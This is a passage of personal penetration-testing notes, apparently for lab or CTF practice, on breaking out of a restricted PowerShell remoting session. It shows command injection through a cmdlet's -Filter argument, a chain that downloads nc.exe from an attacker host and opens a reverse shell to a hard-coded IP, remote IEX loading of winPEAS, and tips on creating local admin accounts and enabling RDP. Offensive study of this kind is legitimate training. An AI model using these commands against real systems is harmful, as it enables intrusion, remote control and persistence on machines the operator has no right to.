command.</p><p></p><p><em>Get-ServicesApplication -Filter &#39;(blah)&#39;   </em></p><p><strong>blah : The term &#39;blah&#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the </strong><strong></strong></p><p><strong>path is correct and try again.</strong><strong></strong></p><p><strong>At line:1 char:45</strong><strong></strong></p><p><strong>+ Get-Service | Select-Object -Property Name,(blah)</strong><strong></strong></p><p><strong>+                                             ~~~~</strong><strong></strong></p><p><strong>    + CategoryInfo          : ObjectNotFound: (blah:String) [], CommandNotFoundException</strong><strong></strong></p><p><strong>    + FullyQualifiedErrorId : CommandNotFoundException</strong></p><p>    </p><p><h3>Passing Command</h3></p><p><span style="color:#ff0000;">MUST use single quotes</span> &amp; not double quotes!</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">With Single Quotes</span></p><p>Even though it throws an error, the output shows that the value of this command (the Domain\User) is being passed into the command that&#39;s executed.</p><p></p><p><em>Get-ServicesApplication -Filter </em><em><span style="color:#ff0000;">&#39;$(whoami)&#39;</span></em></p><p></p><p><strong>Select-Object : Cannot validate argument on parameter &#39;Property&#39;. The argument &quot;</strong><strong><span style="color:#ff0000;">winrm virtual users\winrm va_1_ec2amaz-a6s61fr_safeuserhelpdesk</span></strong><strong>&quot; does not belong to the set </strong><strong></strong></p><p><strong>&quot;ModuleName,Namespace,OutputType,Count,HelpUri,Name,CommandType,ResolvedCommandName,DefaultParameterSet,CmdletBinding,Parameters&quot; specified by the ValidateSet attribute. Supply an argument </strong><strong></strong></p><p><strong>that is in the set and then try the command again.</strong><strong></strong></p><p><strong>At line:1 char:39</strong><strong></strong></p><p><strong>+ Get-Service | Select-Object -Property Name,$(whoami)</strong><strong></strong></p><p><strong>+                                       ~~~~~~~~~~~~~~</strong><strong></strong></p><p><strong>    + CategoryInfo          : InvalidData: (:) [Select-Object], ParameterBindingValidationException</strong><strong></strong></p><p><strong>    + FullyQualifiedErrorId : ParameterArgumentValidationError,Select-Object</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">With Double Quotes</span></p><p><em>Get-ServicesApplication -Filter </em><em><span style="color:#ff0000;">“$(whoami)”</span></em></p><p></p><p><strong>The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.</strong><strong></strong></p><p><strong>    + CategoryInfo          : ParserError: (Get-ServicesApplica…-Filter </strong><strong><span style="color:#ff0000;">&quot;$(whoami)&quot;</span></strong><strong>:String) [], ParseException</strong><strong></strong></p><p><strong>    + FullyQualifiedErrorId : </strong><strong><span style="color:#ff0000;">ScriptsNotAllowed</span></strong><strong></strong></p><p><strong>    </strong><strong></strong></p><p><strong></strong><span style="color:#8ff0a4;text-decoration:underline;">Without Money</span></p><p>Without the <strong>$, </strong>the command will execute with Double Quotes.</p><p></p><p><em>Get-ServicesApplication -Filter </em><em><span style="color:#ff0000;">&quot;(whoami)&quot;</span></em><em> </em></p><p></p><p><h3>Reverse Shell</h3><strong></strong></p><p><strong></strong><span style="color:#ff0000;">Ensure that payloads are the correct Arch</span>, try both if neccesary. Verify that they can be run on target &amp; have specific functionality (i.e the <strong>-e</strong> command if ncat or nc is used). Try different common ports (can test with iwr file uploads).</p><p></p><p><em>Get-ServicesApplication -Filter &#39;$(powershell -c iwr -uri http://ATTACKER/nc.exe -outfile C:\\Windows\\system32\\spool\\drivers\\color\\nc.exe)&#39;</em></p><p></p><p><em>Get-ServicesApplication -Filter &#39;$(C:\\Windows\\system32\\spool\\drivers\\color\\nc.exe 10.50.109.105 443 -e powershell)&#39;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Result</span>: Reverse shell is able to execute all available commands directly &amp; is more responsive.</p><p></p><p><h1>Execute Programs Directly</h1></p><p></p><p><h2>Execute PS Scripts</h2></p><p>Instead of loading them in normally for Cmdlets, can execute them using Invoke-Expression. Still probably need to Bypass ExecutionPolicy.</p><p></p><p><h3>Locally</h3></p><p><em>IEX &quot;C:\inetpub\wwwroot\nt4wrksv\winPEAS.ps1&quot;</em></p><p></p><p><h3>Remotely</h3></p><p><em>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1&#39;)&quot;</em></p><p></p><p><h2>Run EXE Files</h2></p><p>Normally, you can execute them by just specifying the file path</p><p></p><p><h3>PowerShell</h3></p><p>IEX should also be able to run EXE files.</p><p></p><p><h1>Tips</h1><ul><li>If you can access Target&#39;s GUI File Manager &amp; upload a payload to it, it&#39;ll trigger if you<strong> R click </strong>→ <strong>Open</strong></li></ul></p><p><ul><li></li></ul><a name="local vs dom"></a>The <span style="color:#ff0000;">same User may exist as a Local Acct &amp; a Domain Acct</span>. If you <span style="color:#ff0000;">specify hostname</span>, you&#39;ll connect as the Local Acct (e.g to use it as <span style="color:#ff0000;">Local Admin</span>). If you <span style="color:#ff0000;">specify Domain Name</span>, you&#39;ll connect as the Dom Acct (e.g if it&#39;s <span style="color:#ff0000;">Dom Admin</span>)</p><p><ul><li>A Dom Admin may/may not be able to get RCE via <em>impacket-psexec</em>, but even if they can, that Acct may not have RDP access. Can leverage <em>impacket-psexec</em> to create new Local Admin Acct which will have RDP &amp; enable RDP via CME if needed.</li></ul></p><p><ul><li>Even if an Acct <span style="color:#ff0000;">can&#39;t get RCE 1 way</span> (e.g WinRM), they may still be able to <span style="color:#ff0000;">get it with diff method</span> (e.g RDP or SSH).</li></ul></p></div>
</body>
</html>
